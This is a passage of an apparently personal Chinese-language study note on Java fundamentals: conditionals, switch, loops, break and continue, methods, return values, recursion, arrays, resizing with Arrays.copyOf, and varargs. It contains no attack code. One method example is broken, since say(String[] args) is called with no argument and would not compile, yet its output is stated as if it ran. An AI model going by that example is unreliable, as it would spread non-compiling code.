class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.\*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testif</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line"><span class="type">Scanner</span> <span class="variable">input</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">System.out.println(<span class="string">&quot;input number:&quot;</span>);</span><br><span class="line"><span class="type">int</span> <span class="variable">score</span> <span class="operator">=</span> input.nextInt();</span><br><span class="line"><span class="keyword">if</span> (score==<span class="number">100</span>) &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;满分&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(score &lt; <span class="number">100</span> &amp;&amp; score &gt;= <span class="number">90</span>)&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;优秀&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(score &gt; <span class="number">95</span>)&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;差点满分了&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;还是差点&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;？&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">/\*</span><br><span class="line">输出:</span><br><span class="line">input number:</span><br><span class="line"><span class="number">95</span></span><br><span class="line">优秀</span><br><span class="line">还是差点</span><br><span class="line">input number:</span><br><span class="line"><span class="number">98</span></span><br><span class="line">优秀</span><br><span class="line">差点满分了</span><br><span class="line">\*/</span><br></pre></td></tr></table></figure><h3 id="switch分支结构"><a href="#switch分支结构" class="headerlink" title="switch分支结构"></a>switch分支结构</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.\*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testif</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line"><span class="type">Scanner</span> <span class="variable">input</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">System.out.println(<span class="string">&quot;input number:&quot;</span>);</span><br><span class="line"><span class="type">int</span> <span class="variable">score</span> <span class="operator">=</span> input.nextInt();</span><br><span class="line"><span class="keyword">switch</span> (score/<span class="number">10</span>) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">System.out.println(<span class="string">&quot;牛逼&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">System.out.println(<span class="string">&quot;优秀&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">System.out.println(<span class="string">&quot;屁嘞&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">/\*</span><br><span class="line">输出：</span><br><span class="line">input number:</span><br><span class="line"><span class="number">100</span></span><br><span class="line">牛逼</span><br><span class="line">input number:</span><br><span class="line"><span class="number">96</span></span><br><span class="line">优秀</span><br><span class="line">\*/</span><br></pre></td></tr></table></figure><p>整体逻辑 括号里的玩应和case对上了就触发后面的东西 对不上就触发default<br>假如case触发后没有break 则会一路往下继续运行</p><p>注意:switch可判断的类型为 <code>byte short int char String(jdk7以上)</code></p><h2 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span>( i&lt;=<span class="number">100</span> )&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;第&quot;</span>+i+<span class="string">&quot;次&quot;</span>);</span><br><span class="line">i++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>语法:括号里加判断式 大括号加逻辑代码 布尔值为1时 逻辑代码持续运行</p><h2 id="do-while循环"><a href="#do-while循环" class="headerlink" title="do-while循环"></a>do-while循环</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;第&quot;</span>+i+<span class="string">&quot;次&quot;</span>);</span><br><span class="line">i++;</span><br><span class="line">&#125;<span class="keyword">while</span>( i&gt;=<span class="number">100</span> );</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>do-while循环先进行了一次循环操作之后,再进行布尔表达式的判断.<br>即使条件不满足 输出依旧执行了第1次</p><h2 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h2><p>老样子 for后边的括号分三个部分<br>（初始部分（只执行一次）; 循环条件; 迭代部分）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">200</span>;i++)&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;这是&quot;</span>+i);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="控制循环的语句"><a href="#控制循环的语句" class="headerlink" title="控制循环的语句"></a>控制循环的语句</h2><p>一般是用在循环里来控制循环<br><code>break</code>:终止、跳出switch、循环结构.<br><code>continue</code>:结束本次 进入下一次循环.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">200</span>;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(i%<span class="number">4</span> == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (i == <span class="number">99</span>) &#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">&quot;这是&quot;</span>+i);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该代码的运行结果是 能被4整除的数字没有输出 输出到98便停止了|</p><h2 id="方法（类似于其它语言中的函数）"><a href="#方法（类似于其它语言中的函数）" class="headerlink" title="方法（类似于其它语言中的函数）"></a>方法（类似于其它语言中的函数）</h2><p>方法需要定义在类的内部 和main方法并列 不允许方法里再定义方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">20</span>;i++)&#123;</span><br><span class="line">say();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">say</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">5</span>;i++)&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;这是?&quot;</span>+i);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出:重复20遍的1-5<br>方法后面的括号可以添加形式参数（等价于局部变量的声明）<br>这样以后在调用这个参数的时候就要在括号里加入对应的实际参数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">5</span>;i++)&#123;</span><br><span class="line">say(<span class="number">11112</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">say</span><span class="params">(<span class="type">int</span> word)</span> &#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">5</span>;i++)&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;这是?&quot;</span>+word);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出: 25遍11112<br>也能通过逗号来传多个参数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">5</span>;i++)&#123;</span><br><span class="line">say(<span class="number">11112</span>,<span class="string">&#x27;啥&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">say</span><span class="params">(<span class="type">int</span> word,<span class="type">char</span> fuhao)</span> &#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">5</span>;i++)&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;这是&quot;</span>+fuhao+word);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出:25遍这是啥11112</p><h2 id="return和返回值"><a href="#return和返回值" class="headerlink" title="return和返回值"></a>return和返回值</h2><p>方法所返回的数据类型和具体内容由方法名称前的前一个项决定<br>public static void www() &#x2F;&#x2F;void指返回空值<br>public static int www() &#x2F;&#x2F;返回一个int的方法<br>至于返回使用return 数值;语句执行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">5</span>;i++)&#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">y</span> <span class="operator">=</span> say(<span class="number">2</span>,<span class="string">&#x27;啥&#x27;</span>);</span><br><span class="line">System.out.println(y);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">say</span><span class="params">(<span class="type">int</span> word,<span class="type">char</span> fuhao)</span> &#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">5</span>;i++)&#123;</span><br><span class="line">word++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> word-<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出:返回了五个6<br>有返回的类型必须要保证<strong>在任何情况下</strong>都会返回一个值 不然便会报错<br>return用在void类型的方法中相当于直接终止该方法</p><h2 id="方法调用与递归"><a href="#方法调用与递归" class="headerlink" title="方法调用与递归"></a>方法调用与递归</h2><p>当存在多个方法时 顺序为优先执行方法内部的代码 结束后 返回到调用的地方 再继续往下执行</p><p>递归指的是再方法内部再次调用自身的编程方式 但不正确使用容易出现内存问题</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">int</span> num= f(<span class="number">10</span>);</span><br><span class="line">System.err.println(num);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> n==<span class="number">1</span>?<span class="number">1</span>:n\*f(n-<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">int</span>[] a=<span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>声明一个数组: <code>数据类型[] 数组名;</code><br>分配数组空间: <code>new 数据类型[长度];</code><br>声明并分配空间: <code>数据类型[] 数组名 = new 数组类型[长度]</code><br>声明并赋值:<br><code>数据类型[] 数组名 = new 数据类型[]&#123;1,2,3&#125;;</code><br><code>数据类型[] 数组名 = &#123;1,2,3&#125;;</code> &#x2F;&#x2F;期间不能换行<br><strong>至于数组的组成 数组中的每个数据格被称为“数组元素”</strong><br><strong>对每个元素进行赋值或取值被称为“元素的访问”</strong><br><strong>访问元素的时候 需要使用“下标”(从0开始,依次+1,自动生成)</strong><br><strong>访问的语法:数组名[下标]; 存数据:a[0] &#x3D; 10; 取数据 a[0];</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">int</span>[] a = <span class="keyword">new</span> <span class="title class_">int</span> [<span class="number">5</span>];</span><br><span class="line">a[<span class="number">0</span>]=<span class="number">5</span>;</span><br><span class="line">a[<span class="number">1</span>]=<span class="number">3</span>;</span><br><span class="line">a[<span class="number">2</span>]=<span class="number">4</span>;</span><br><span class="line">a[<span class="number">3</span>]=<span class="number">7</span>;</span><br><span class="line">a[<span class="number">4</span>]=<span class="number">10</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;i &lt; <span class="number">5</span>;i++)&#123;</span><br><span class="line">System.out.println(a[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出:依次输出 5 3 4 7 10<br>想表示数组的长度 可以在数组名后加.length</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.\*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">int</span>[] nums =&#123;<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">11</span>&#125;;</span><br><span class="line"><span class="type">Scanner</span> <span class="variable">input</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">System.err.println(<span class="string">&quot;请输入一个整数:&quot;</span>);</span><br><span class="line"><span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> input.nextInt();</span><br><span class="line"><span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;i &lt; nums.length;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(nums[i]==num)&#123;</span><br><span class="line">System.out.println(i);</span><br><span class="line">flag = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (flag == <span class="literal">false</span>) &#123;</span><br><span class="line">System.err.println(-<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>上式所实现的内容:查看输入的数是否和数组中的元素对应 如果是 输出对应下标 如果不是 输出-1</strong></p><h2 id="数组的扩容"><a href="#数组的扩容" class="headerlink" title="数组的扩容"></a>数组的扩容</h2><p>创建数组时 必须指定长度 并且在创建后不可更改<br>想要实现数组扩容 只能创建一个新的数组并导入旧数据</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test5</span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">int</span>[] nums =&#123;<span class="number">11</span>,<span class="number">22</span>,<span class="number">33</span>,<span class="number">44</span>,<span class="number">55</span>&#125;;</span><br><span class="line"><span class="type">int</span>[] newints = <span class="keyword">new</span> <span class="title class_">int</span>[nums.length\*<span class="number">2</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;i&lt;nums.length;i++)&#123;</span><br><span class="line">newints[i]=nums[i];</span><br><span class="line">&#125;</span><br><span class="line">System.err.println(Arrays.toString(newints));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Arrays.toString可以实现将数组转为字符串后输出</span></span><br><span class="line"><span class="comment">// 输出： [11, 22, 33, 44, 55, 0, 0, 0, 0, 0]</span></span><br></pre></td></tr></table></figure><p>除去这个比较麻烦的 还有两个更加快捷的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">System.arraycopy(原数组，原数组起始，新数组，新数组起始，长度);</span><br><span class="line">java.util.Arrays.copyOf(原数组，新长度); <span class="comment">//返回带有原数值的新数组</span></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test5</span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">int</span>[] nums =&#123;<span class="number">11</span>,<span class="number">22</span>,<span class="number">33</span>,<span class="number">44</span>,<span class="number">55</span>&#125;;</span><br><span class="line"><span class="type">int</span>[] newints = <span class="keyword">new</span> <span class="title class_">int</span>[nums.length\*<span class="number">2</span>];</span><br><span class="line"><span class="type">int</span>[] newints1 = &#123;&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;i&lt;nums.length;i++)&#123;</span><br><span class="line">newints[i]=nums[i];</span><br><span class="line">&#125;</span><br><span class="line">nums = Arrays.copyOf(nums, <span class="number">100</span>);</span><br><span class="line">System.out.println(Arrays.toString(newints));</span><br><span class="line">System.out.println(Arrays.toString(nums));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//前面那个不好使 只用后边的</span></span><br></pre></td></tr></table></figure><h2 id="数组类型的参数"><a href="#数组类型的参数" class="headerlink" title="数组类型的参数"></a>数组类型的参数</h2><p>当然 数组也能拿去在方法里使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test5</span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">int</span>[] nums =&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line">add(nums);</span><br><span class="line">System.out.println(Arrays.toString(nums));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)&#123;</span><br><span class="line">nums[i] += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 输出了&#123;2,3,4,5,6&#125;</span></span><br></pre></td></tr></table></figure><h2 id="可以变长的参数"><a href="#可以变长的参数" class="headerlink" title="可以变长的参数"></a>可以变长的参数</h2><p>概念:可以接收多个同类型实参 个数不限 使用方式与数组相同<br>语法：数据类型… 形参名 &#x2F;&#x2F;必须定义在形参列表的最后 且只能有一个</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test5</span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">add(<span class="number">1</span>,<span class="number">23</span>,<span class="number">4324</span>,<span class="number">65345</span>,<span class="number">23123</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span>... nums)</span> &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span 